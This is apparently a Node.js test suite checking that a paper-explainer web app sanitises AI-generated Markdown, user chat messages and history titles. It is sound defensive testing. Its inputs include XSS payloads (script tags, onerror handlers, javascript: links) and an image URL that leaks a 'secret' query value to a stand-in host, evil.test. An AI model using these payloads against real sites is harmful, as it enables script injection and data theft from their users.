'use strict';
const { describe, it, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const { boot, disposeAll, json } = require('./helpers/app');

afterEach(disposeAll);

// Same libraries (and versions) that index.html loads from the CDN with SRI.
const LIBS = ['node_modules/marked/marked.min.js', 'node_modules/dompurify/dist/purify.min.js'];

async function render(markdown) {
    const app = await boot({ libs: LIBS });
    const el = app.document.createElement('div');
    app.window.renderMarkdownWithMath(el, markdown);
    return { app, el };
}

describe('rendering model output safely', () => {
    it('renders Markdown: headings, bold, lists and tables', async () => {
        const { el } = await render('# Title\n\n**bold** and *italic*\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |');
        assert.equal(el.querySelector('h1').textContent, 'Title');
        assert.equal(el.querySelector('strong').textContent, 'bold');
        assert.equal(el.querySelectorAll('li').length, 2);
        assert.equal(el.querySelectorAll('td').length, 2);
    });

    it('strips scripts, event handlers and javascript: links from the answer', async () => {
        const { el } = await render('Hi <script>window.pwned = 1</script> <b onclick="window.pwned = 2">b</b> [x](javascript:alert(1)) <iframe src="https://evil.test"></iframe>');
        assert.equal(el.querySelector('script'), null);
        assert.equal(el.querySelector('iframe'), null);
        assert.equal(el.querySelector('b').getAttribute('onclick'), null);
        assert.ok(!/javascript:/i.test(el.innerHTML));
    });

    it('forbids images, styles, forms and inputs (a remote image could leak the paper text)', async () => {
        const { el } = await render('![x](https://evil.test/p.png?q=secret) <img src="https://evil.test/a.png" onerror="1"> <style>*{display:none}</style> <form action="https://evil.test"><input name="a"><button>go</button></form>');
        for (const tag of ['img', 'style', 'form', 'input', 'button']) assert.equal(el.querySelector(tag), null, `<${tag}> must be removed`);
    });

    it('external links open in a new tab without referrer', async () => {
        const { el } = await render('[paper](https://example.com/paper)');
        const a = el.querySelector('a');
        assert.equal(a.getAttribute('target'), '_blank');
        assert.equal(a.getAttribute('rel'), 'noopener noreferrer');
    });

    it('protects LaTeX from Markdown: underscores and asterisks inside formulas survive', async () => {
        const { el } = await render('Inline $a_b * c_d$ and block:\n\n$$\\sum_{i=1}^{n} x_i * y_i$$');
        const text = el.textContent;
        assert.ok(text.includes('$a_b * c_d$'), 'inline math untouched: ' + text);
        assert.ok(text.includes('\\sum_{i=1}^{n} x_i * y_i'), 'display math untouched');
        assert.equal(el.querySelector('em'), null, 'no accidental italics from the underscores');
    });

    it('HTML inside a formula is escaped (formulas are restored after DOMPurify)', async () => {
        const { el } = await render('Bad formula: $<img src=x onerror=alert(1)>$ and $$<script>alert(2)</script>$$');
        assert.equal(el.querySelector('img'), null);
        assert.equal(el.querySelector('script'), null);
        assert.ok(el.textContent.includes('<img src=x onerror=alert(1)>'), 'shown as text');
    });

    it('prices and plain dollar signs are not mistaken for math across lines', async () => {
        const { el } = await render('It costs $5\n\nand later $10 more');
        assert.ok(el.textContent.includes('$5'));
        assert.ok(el.textContent.includes('$10'));
    });

    it('KaTeX is only requested when there is a formula', async () => {
        const noMath = await render('No formulas here.');
        const scripts = (app) => [...app.document.head.querySelectorAll('script, link[rel="stylesheet"]')].map((n) => n.src || n.href);
        assert.deepEqual(scripts(noMath.app).filter((u) => /katex/.test(u)), []);

        const withMath = await render('Energy is $E = mc^2$.');
        assert.ok(scripts(withMath.app).some((u) => /katex@0\.16\.11.*katex\.min\.css/.test(u)), 'css requested with SRI');
        const link = withMath.app.document.head.querySelector('link[href*="katex.min.css"]');
        assert.match(link.integrity, /^sha384-/);
        assert.equal(link.crossOrigin, 'anonymous');
    });

    it('escapes HTML instead of inserting it when DOMPurify is not available', async () => {
        const app = await boot({ libs: ['node_modules/marked/marked.min.js'] });
        const el = app.document.createElement('div');
        app.window.renderMarkdownWithMath(el, 'x <img src=x onerror=alert(1)> y');
        assert.equal(el.querySelector('img'), null);
        assert.ok(el.textContent.includes('<img'));
    });

    it('the explanation shown on the page goes through the same sanitizer', async () => {
        const app = await boot({
            libs: LIBS,
            handler: () => json({ choices: [{ message: { content: '# Safe title\n\n<img src=x onerror="window.pwned=1"> text <script>window.pwned=2</script>' } }] })
        });
        app.configure('openai');
        app.$('paperTitleInput').value = 'anything';
        await app.window.analyzePaper();
        assert.match(app.$('explanationOutput').textContent, /text/);
        assert.equal(app.$('explanationOutput').querySelector('img'), null);
        assert.equal(app.$('explanationOutput').querySelector('script'), null);
        assert.equal(app.window.pwned, undefined);
    });

    it('chat messages from the user are inserted as text, never as HTML', async () => {
        const app = await boot({ libs: LIBS });
        app.configure('openai');
        app.$('paperTitleInput').value = 'anything';
        await app.window.analyzePaper();
        app.window.sendFollowUpQuestion('<img src=x onerror="window.pwned=1"> hello');
        await app.settle();
        const bubbles = app.$('chatMessagesContainer');
        assert.equal(bubbles.querySelector('img'), null);
        assert.ok(bubbles.textContent.includes('<img src=x onerror="window.pwned=1"> hello'));
        assert.equal(app.window.pwned, undefined);
    });

    it('paper titles in the history are escaped', async () => {
        const app = await boot({
            libs: LIBS,
            handler: () => json({ choices: [{ message: { content: '# <img src=x onerror="window.pwned=1"> Evil\n\nbody' } }] })
        });
        app.configure('openai');
        app.$('paperTitleInput').value = 'anything';
        await app.window.analyzePaper();
        assert.equal(app.$('historyList').querySelector('img'), null);
        assert.equal(app.window.pwned, undefined);
    });

    it('downloads a Markdown file named after the paper, with a header in the current language', async () => {
        const app = await boot({
            libs: LIBS,
            handler: () => json({ choices: [{ message: { content: '# Attention Is All You Need: Ünïcode & Co.\n\nbody' } }] })
        });
        app.configure('openai');
        app.$('paperTitleInput').value = 'anything';
        await app.window.analyzePaper();

        const saved = {};
        app.window.URL.createObjectURL = (blob) => { saved.blob = blob; return 'blob:fake'; };
        app.window.URL.revokeObjectURL = () => {};
        const realCreate = app.document.createElement.bind(app.document);
        app.document.createElement = (tag) => {
            const el = realCreate(tag);
            if (tag === 'a') el.click = () => { saved.filename = el.download; };
            return el;
        };
        app.window.downloadMarkdown();
        assert.equal(saved.filename, 'PaperClaro_attention-is-all-you-need-unicode-co.md');
        const readBlob = (blob) => new Promise((resolve) => {   // jsdom's Blob has no .text()
            const reader = new app.window.FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsText(blob);
        });
        const content = await readBlob(saved.blob);
        assert.match(content, /^> Generated by \*\*PaperClaro AI\*\* · University Level · Full Analysis\n\n# Attention/);

        app.window.setLang('es');
        app.window.downloadMarkdown();
        assert.match(await readBlob(saved.blob), /^> Generado por \*\*PaperClaro AI\*\* · Nivel Universitario · Análisis Completo/);
    });
});
